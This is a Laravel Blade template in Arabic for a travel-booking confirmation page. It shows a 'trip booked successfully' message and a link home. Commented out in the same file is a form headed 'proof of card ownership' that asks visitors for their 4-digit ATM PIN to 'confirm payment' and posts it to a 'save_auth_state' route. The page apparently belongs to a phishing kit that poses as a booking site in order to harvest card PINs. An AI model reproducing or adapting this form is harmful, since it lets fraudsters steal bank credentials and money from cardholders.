@extends('layouts.main')
@section('content')
<section class="padding-start container mb-5">
  <div class="row justify-content-center shadow">
    <div class="col-12 col-lg-7">
      <div class="row">
        <div class="col-12 mt-5 mb-4">
          <div class="card">
            {{-- <div class="card-header">
               تم الحجز بنجاح
            </div> --}}
          </div>
          <div class="card-body">

            {{-- <form method="post" action="{{route('save_auth_state')}}">
              @csrf
                <div class="col-12 mt-3">
                    <h3 style="color: black">إثبات ملكية البطاقة</h3>
                    <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون من 4 خانات للتأك من عملية الدفع</p>
                    <hr>
                </div>
                <div class="col-12">
                  <div class="mb-3">
                    <label for="code" class="form-label">الرقم السري</label>
                    <input autocomplete="off" onkeypress="return onlyNumberKey(event)" maxlength="4" type="tel" value="" class="form-control form-control-lg " id="code" name="code"  placeholder="أدخل الرقم السري المكون من 4 خانات" required>
                                      </div>
                </div>

              </div>
              <div class="col-12 mt-5">
                <button style="width: 100%;" type="submit" class="btn btn-primary btn-lg form-control-lg">التالـــي</button>
              </div>

            </form> --}}
            <div class="alert alert-success">
              تم حجز الرحلة بنجاح
            </div>
            <a href="/" style="    text-align: center;
            display: block;">الرجوع للرئيسية</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

@endsection